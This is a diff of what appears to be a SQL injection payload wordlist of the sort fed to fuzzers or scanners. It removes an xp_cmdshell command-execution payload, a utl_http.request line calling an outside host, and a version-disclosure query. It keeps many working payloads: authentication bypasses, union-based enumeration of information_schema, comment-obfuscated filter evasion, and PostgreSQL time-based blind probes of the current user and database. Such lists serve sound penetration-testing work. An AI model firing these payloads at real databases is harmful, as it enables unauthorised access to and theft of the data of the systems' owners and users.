@@ -13,9 +13,7 @@ x' and 1=(select count(*) from tabname); --
 x' and members.email is NULL; --
 x' or full_name like '%bob%
 23 or 1=1; --
-'; exec master..xp_cmdshell 'ping 172.10.1.255'--
 ' or '1'='1
-'||utl_http.request('httP://192.168.1.1/')||'
 ' or 1=1--
 " or 1=1--
 ' or 'a'='a
@@ -24,7 +22,6 @@ x' or full_name like '%bob%
 admin' or '
 ' select * from information_schema.tables--
 ) union select * from information_schema.tables;
-' union all select @@version--
 ' union select * from users where login = char(114,111,111,116);
 ' union select 
 '/**/or/**/1/**/=/**/1
@@ -41,4 +38,3 @@ uni/**/on sel/**/ect
 '||(SELECT 1 FROM pg_sleep(5))--
 ' AND 1=(SELECT CASE WHEN (SELECT length(current_user))>3 THEN pg_sleep(5) ELSE 0 END)-- 
 ' AND 1=(SELECT CASE WHEN (SELECT substring(current_database(),1,1))='a' THEN pg_sleep(5) ELSE 0 END)--
-
